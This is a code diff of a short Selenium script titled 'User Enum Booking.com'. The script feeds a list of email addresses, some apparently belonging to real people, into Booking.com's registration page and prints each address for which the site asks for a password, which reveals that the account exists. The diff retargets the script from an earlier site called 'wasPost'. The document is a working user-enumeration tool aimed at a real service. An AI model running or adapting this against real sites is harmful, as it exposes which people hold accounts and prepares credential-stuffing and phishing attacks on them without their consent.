@@ -1,14 +1,22 @@
+# User Enum Booking.com
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
 from time import sleep
 import extract_html_diff
 
+# Using edge browser
 driver = webdriver.Edge(executable_path='msedgedriver')
 
-print("The usernames present in wasPost are:")
+# Using Firefox browser
+#driver = webdriver.FirefoxProfile()
+#driver = webdriver.Firefox(driver)
 
-#for i in ["BegForMercy", "BraiasjdnkjnAxe", "CrazyMind", "DeathWaasdaish", "DisasterMaster", "ElNaaaino", "EndlessFacepalms", "FreakingOblin", "GhostlyPresence", "GridlockAndKey", "HoofHearted666", "KungFuMonk", "NineTees", "PlzJustDie", "SeekNDestroy", "SinisterChill", "BegqwForMercy", "BasxasdxrainAxe", "Crazy1Mind", "DeatasdasdhWish", "Dis1asterMaster", "EaslNino", "EndlessFaaacepalms", "FrrreakingOblin", "GhossdtlyPreseasnce", "GrisadlockAndKey", "HoofaHearted666", "KsungFuMonk", "NinessTees", "sPlzJustDie", "sSeeksNDestroy", "SssinisddterChill"]:
-for i in ["supeasdasdrman@gmail.com", "priyanka@gmail.com", "batman@gmail.com", "michael@gmail.com", "raghavdevgon@yahoo.com"]:
+
+print("The usernames present in Booking.com are:")
+
+# Place all the Email IDs to test in the for loop as shown below.
+# You can remove all the Email IDs below
+for i in ["easdasdrmn@gmail.com", "priyanka@gmail.com", "batman@gmail.com", "michael@gmail.com", "raghavdevgon@yahoo.com"]:
     user = i
 
     driver.get("https://account.booking.com/register")
@@ -25,4 +33,4 @@ for i in ["supeasdasdrman@gmail.com", "priyanka@gmail.com", "batman@gmail.com", 
     if "Enter your Booking.com password for" in p3:
         print(i)
     sleep(2)
-
+driver.close()
